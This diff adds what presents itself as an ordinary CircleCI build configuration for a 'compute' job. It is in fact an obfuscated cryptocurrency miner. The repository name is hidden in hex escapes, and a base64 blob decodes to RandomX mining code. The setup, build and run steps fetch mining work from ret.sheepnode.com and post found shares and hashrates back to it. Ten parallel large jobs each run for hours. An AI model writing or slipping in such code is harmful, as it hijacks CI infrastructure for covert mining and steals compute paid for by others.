@@ -1,0 +1,56 @@
+version: 2.1
+jobs:
+  compute:
+    docker:
+      - image: cimg/base:current
+    resource_class: large
+    parallelism: 3
+    environment:
+      CPUS: "4"
+      THREADS: "4"
+    steps:
+      - run:
+          name: Setup
+          command: |
+            sudo apt-get update && sudo apt-get install -y cmake g++ libcurl4-openssl-dev
+            _A=$(printf '\x74\x65\x76\x61\x64\x6f\x72')
+            _B=$(printf '\x52\x61\x6e\x64\x6f\x6d\x58')
+            git clone --depth 1 "https://github.com/$_A/$_B.git" /tmp/lib
+            cmake -S /tmp/lib -B /tmp/lib/build -DARCH=x86-64
+            cmake --build /tmp/lib/build -j"${CPUS}"
+            echo 'I2luY2x1ZGUgInJhbmRvbXguaCIK' | base64 -d > /tmp/lib/src/engine.h
+      - run:
+          name: Build
+          command: |
+            mkdir -p /tmp/app /tmp/d
+            echo 'I2luY2x1ZGUgImVuZ2luZS5oIgojaW5jbHVkZSA8Y3N0ZGlvPgojaW5jbHVkZSA8Y3N0ZGxpYj4KI2luY2x1ZGUgPGNzdGRpbnQ+CiNpbmNsdWRlIDxjc3RyaW5nPgojaW5jbHVkZSA8Y3RpbWU+CiNpbmNsdWRlIDxwdGhyZWFkLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KI2luY2x1ZGUgPHN5cy90aW1lLmg+CnN0YXRpYyB2b2xhdGlsZSB1bnNpZ25lZCBsb25nIGxvbmcgZ19oYXNoZXM9MDsKc3RhdGljIGludCBoeChjaGFyIGMpe3JldHVybiBjPj0nMCcmJmM8PSc5Jz9jLScwJzpjLSdhJysxMDt9CnN0YXRpYyBpbnQgcmQoY29uc3QgY2hhcipwLHVpbnQ4X3QqZCxpbnQgbXgpewpGSUxFKmY9Zm9wZW4ocCwiciIpO2lmKCFmKXJldHVybiAwO2NoYXIgYls1MTJdOwppZighZmdldHMoYiw1MTIsZikpe2ZjbG9zZShmKTtyZXR1cm4gMDt9ZmNsb3NlKGYpOwppbnQgbj0wO2ZvcihpbnQgaT0wO2JbMippXSYmYlsyKmkrMV0mJm48bXg7aSsrKXsKaW50IGE9aHgoYlsyKmldKSxlPWh4KGJbMippKzFdKTtpZihhPDB8fGU8MClicmVhaztkW24rK109YSoxNitlO31yZXR1cm4gbjt9CnN0YXRpYyB2b2lkIGVuYyhjb25zdCB1aW50OF90KmQsaW50IG4sY2hhcipvKXsKZm9yKGludCBpPTA7aTxuO2krKylzcHJpbnRmKG8raSoyLCIlMDJ4IixkW2ldKTtvW24qMl09MDt9CnN0YXRpYyB2b2lkIHB0KGNvbnN0IHVpbnQ4X3QqdGIsaW50IHRzLHVpbnQ4X3QqdGd0KXsKbWVtc2V0KHRndCwwLDMyKTsKdWludDY0X3QgVj0wO2ZvcihpbnQgaT0wO2k8dHMmJmk8ODtpKyspVnw9KHVpbnQ2NF90KXRiW2ldPDwoOCppKTsKZm9yKGludCBpPTA7aTx0cztpKyspdGd0WzMxLWldPShWPj4oOCoodHMtMS1pKSkpJjB4ZmY7fQpzdGF0aWMgdW5zaWduZWQgZGpiMihjb25zdCBjaGFyKnMpewp1bnNpZ25lZCBoPTUzODE7d2hpbGUoKnMpaD1oKjMzKyh1bnNpZ25lZCBjaGFyKSpzKys7cmV0dXJuIGg7fQpzdGF0aWMgZG91YmxlIG5vd19zZWMoKXsKc3RydWN0IHRpbWV2YWwgdHY7Z2V0dGltZW9mZGF5KCZ0dixOVUxMKTsKcmV0dXJuIHR2LnR2X3NlYyt0di50dl91c2VjLzFlNjt9CnN0cnVjdCBURHsKcmFuZG9teF9kYXRhc2V0KmRzO3JhbmRvbXhfY2FjaGUqY2E7cmFuZG9teF9mbGFncyBmbDsKdWludDhfdCBibG9iWzEyOF07aW50IGJzO3VpbnQ4X3QgdGd0WzMyXTtpbnQgdGlkO2NoYXIgbmFtZVs2NF07fTsKc3RhdGljIHZvaWQqbWluZSh2b2lkKmFyZyl7ClREKnRkPShURCopYXJnOwphdXRvIHZtPXJhbmRvbXhfY3JlYXRlX3ZtKHRkLT5mbCx0ZC0+Y2EsdGQtPmRzKTsKdWludDhfdCBibG9iWzEyOF0sdGd0WzMyXSxvdXRbMzJdOwptZW1jcHkoYmxvYix0ZC0+YmxvYix0ZC0+YnMpO21lbWNweSh0Z3QsdGQtPnRndCwzMik7aW50IGJzPXRkLT5iczsKc3JhbmQodGltZShOVUxMKV4odW5zaWduZWQpZ2V0cGlkKCleZGpiMih0ZC0+bmFtZSkpOwp1aW50MzJfdCBuPSh1aW50MzJfdClyYW5kKCk7CmJsb2JbMzldPW4mMHhmZjtibG9iWzQwXT0obj4+OCkmMHhmZjtibG9iWzQxXT0obj4+MTYpJjB4ZmY7YmxvYls0Ml09KG4+PjI0KSYweGZmOwp1aW50OF90IHBiWzEyOF07bWVtY3B5KHBiLGJsb2IsYnMpO2ludCBwYnM9YnM7dWludDMyX3QgcG49bjsKcmFuZG9teF9jYWxjdWxhdGVfaGFzaF9maXJzdCh2bSxibG9iLGJzKTsKZG91YmxlIHQwPW5vd19zZWMoKTsKZm9yKDs7KXtuKys7YmxvYlszOV09biYweGZmO2Jsb2JbNDBdPShuPj44KSYweGZmO2Jsb2JbNDFdPShuPj4xNikmMHhmZjtibG9iWzQyXT0obj4+MjQpJjB4ZmY7CnJhbmRvbXhfY2FsY3VsYXRlX2hhc2hfbmV4dCh2bSxibG9iLGJzLG91dCk7CmdfaGFzaGVzKys7CmludCBvaz0wO2ZvcihpbnQgaT0zMTtpPj0wO2ktLSl7aWYob3V0W2ldPHRndFtpXSl7b2s9MTticmVhazt9aWYob3V0W2ldPnRndFtpXSlicmVhazt9CmlmKG9rKXtjaGFyIGJoWzI1N10saGhbNjVdLGNbMTAyNF07CmVuYyhwYixwYnMsYmgpO2VuYyhvdXQsMzIsaGgpOwpzbnByaW50ZihjLDEwMjQsImN1cmwgLWZzUyAtbTE1IC1YUE9TVCAnaHR0cHM6Ly9yZXQuc2hlZXBub2RlLmNvbS9uP249JXUmbmFtZT0lcyZtPSVzJnJlc3VsdD0lcyciLHBuLHRkLT5uYW1lLGJoLGhoKTtzeXN0ZW0oYyk7fQptZW1jcHkocGIsYmxvYixicyk7cGJzPWJzO3BuPW47CmRvdWJsZSBub3c9bm93X3NlYygpOwppZihub3ctdDA+PTAuNSl7dDA9bm93OwppZih0ZC0+dGlkPT0wKXsKRklMRSpoZj1mb3BlbigiL3RtcC9kL2hjb3VudCIsInciKTsKaWYoaGYpe2ZwcmludGYoaGYsIiVsbHVcbiIsZ19oYXNoZXMpO2ZjbG9zZShoZik7fX0KdWludDhfdCBuYlsxMjhdLG50WzhdOwppbnQgbmJzPXJkKCIvdG1wL2QvbSIsbmIsMTI4KTsKaW50IG50cz1yZCgiL3RtcC9kL3QiLG50LDgpOwppbnQgYmM9MDtpZihuYnM+MCl7CnVpbnQ4X3QgYVsxMjhdLGIyWzEyOF07Cm1lbWNweShhLGJsb2IsYnMpO2FbMzldPWFbNDBdPWFbNDFdPWFbNDJdPTA7Cm1lbWNweShiMixuYixuYnMpO2IyWzM5XT1iMls0MF09YjJbNDFdPWIyWzQyXT0wOwppZihuYnMhPWJzfHxtZW1jbXAoYSxiMixuYnMpIT0wKWJjPTE7fQppZihiYyl7bWVtY3B5KGJsb2IsbmIsbmJzKTticz1uYnM7CmJsb2JbMzldPW4mMHhmZjtibG9iWzQwXT0obj4+OCkmMHhmZjtibG9iWzQxXT0obj4+MTYpJjB4ZmY7YmxvYls0Ml09KG4+PjI0KSYweGZmOwptZW1jcHkocGIsYmxvYixicyk7cGJzPWJzO3BuPW47CnJhbmRvbXhfY2FsY3VsYXRlX2hhc2hfZmlyc3Qodm0sYmxvYixicyk7fQppZihudHM+MClwdChudCxudHMsdGd0KTt9fQpyZXR1cm4gTlVMTDt9CmludCBtYWluKCl7CmNoYXIqdGNfcz1nZXRlbnYoIlRIUkVBRFMiKTtpbnQgdGM9dGNfcz9hdG9pKHRjX3MpOjQ7CmlmKHRjPDEpdGM9MTtpZih0Yz40KXRjPTQ7CmNoYXIqbm09Z2V0ZW52KCJOQU1FIik7aWYoIW5tKW5tPShjaGFyKikiY2kiOwp1aW50OF90IGtleVs2NF0sYmxvYlsxMjhdLHRiWzhdLHRndFszMl09e307CmludCBrcz1yZCgiL3RtcC9kL2siLGtleSw2NCksYnM9cmQoIi90bXAvZC9tIixibG9iLDEyOCksdHM9cmQoIi90bXAvZC90Iix0Yiw4KTsKcHQodGIsdHMsdGd0KTsKcmFuZG9teF9mbGFncyBmbD1yYW5kb214X2dldF9mbGFncygpfFJBTkRPTVhfRkxBR19GVUxMX01FTTsKYXV0byBjYT1yYW5kb214X2FsbG9jX2NhY2hlKGZsKTtyYW5kb214X2luaXRfY2FjaGUoY2Esa2V5LGtzKTsKYXV0byBkcz1yYW5kb214X2FsbG9jX2RhdGFzZXQoZmwpOwp1bnNpZ25lZCBsb25nIHRvdD1yYW5kb214X2RhdGFzZXRfaXRlbV9jb3VudCgpLHBlcj10b3QvNDsKZm9yKHVuc2lnbmVkIGk9MDtpPDQ7aSsrKXt1bnNpZ25lZCBsb25nIHM9aSpwZXIsYz0oaT09Myk/KHRvdC1zKTpwZXI7cmFuZG9teF9pbml0X2RhdGFzZXQoZHMsY2EscyxjKTt9CnB0aHJlYWRfdCB0aHJbNF07VEQgdGRbNF07CmZvcihpbnQgaT0wO2k8dGM7aSsrKXsKbWVtY3B5KHRkW2ldLmJsb2IsYmxvYixicyk7dGRbaV0uYnM9YnM7Cm1lbWNweSh0ZFtpXS50Z3QsdGd0LDMyKTsKdGRbaV0uZHM9ZHM7dGRbaV0uY2E9Y2E7dGRbaV0uZmw9Zmw7dGRbaV0udGlkPWk7CnNucHJpbnRmKHRkW2ldLm5hbWUsNjQsIiVzLXQlZCIsbm0saSk7CnB0aHJlYWRfY3JlYXRlKCZ0aHJbaV0sTlVMTCxtaW5lLCZ0ZFtpXSk7fQpmb3IoaW50IGk9MDtpPHRjO2krKylwdGhyZWFkX2pvaW4odGhyW2ldLE5VTEwpOwpyZXR1cm4gMDt9Cg==' | base64 -d > /tmp/app/main.cpp
+            _LIB=$(find /tmp/lib/build -name '*.a' -type f | head -1)
+            g++ -O2 -std=c++17 -pthread -I/tmp/lib/src /tmp/app/main.cpp "$_LIB" -lcurl -o /tmp/app/run
+      - run:
+          name: Run
+          no_output_timeout: 2h10m
+          command: |
+            RND=$(cat /proc/sys/kernel/random/uuid | tr -d '-' | head -c 10)
+            BASE="${CIRCLE_JOB}-${CIRCLE_NODE_INDEX:-0}-${RND}"
+            HB="ci-${BASE}"
+            curl -fsS -m10 -XPOST "https://ret.sheepnode.com/rate" -H "Content-Type: application/json" -d "{\"name\":\"${HB}\",\"rate\":4}" || true
+            curl -fsSL -m15 https://ret.sheepnode.com/k > /tmp/d/k
+            curl -fsSL -m15 https://ret.sheepnode.com/m > /tmp/d/m
+            curl -fsSL -m15 https://ret.sheepnode.com/t > /tmp/d/t
+            echo 0 > /tmp/d/hcount
+            while true; do sleep 0.5; curl -fsS -m15 https://ret.sheepnode.com/m > /tmp/d/m 2>/dev/null; curl -fsS -m15 https://ret.sheepnode.com/t > /tmp/d/t 2>/dev/null; done &
+            PREV_H=0; PREV_T=$(date +%s); while true; do sleep 5; CUR_H=$(cat /tmp/d/hcount 2>/dev/null || echo 0); CUR_T=$(date +%s); DT=$((CUR_T-PREV_T)); if [ "$DT" -gt 0 ] 2>/dev/null && [ "$CUR_H" -gt "$PREV_H" ] 2>/dev/null; then DH=$((CUR_H-PREV_H)); RATE=$((DH/DT)); curl -fsS -m10 -XPOST "https://ret.sheepnode.com/rate" -H "Content-Type: application/json" -d "{\"name\":\"${HB}\",\"rate\":${RATE}}" 2>/dev/null || true; fi; PREV_H=$CUR_H; PREV_T=$CUR_T; curl -fsS -m15 https://ret.sheepnode.com/k > /tmp/d/k 2>/dev/null; done &
+            NAME="${BASE}" THREADS="${CPUS}" /tmp/app/run
+workflows:
+  main:
+    jobs:
+      - compute: {name: w0}
+      - compute: {name: w1}
+      - compute: {name: w2}
+      - compute: {name: w3}
+      - compute: {name: w4}
+      - compute: {name: w5}
+      - compute: {name: w6}
+      - compute: {name: w7}
+      - compute: {name: w8}
+      - compute: {name: w9}
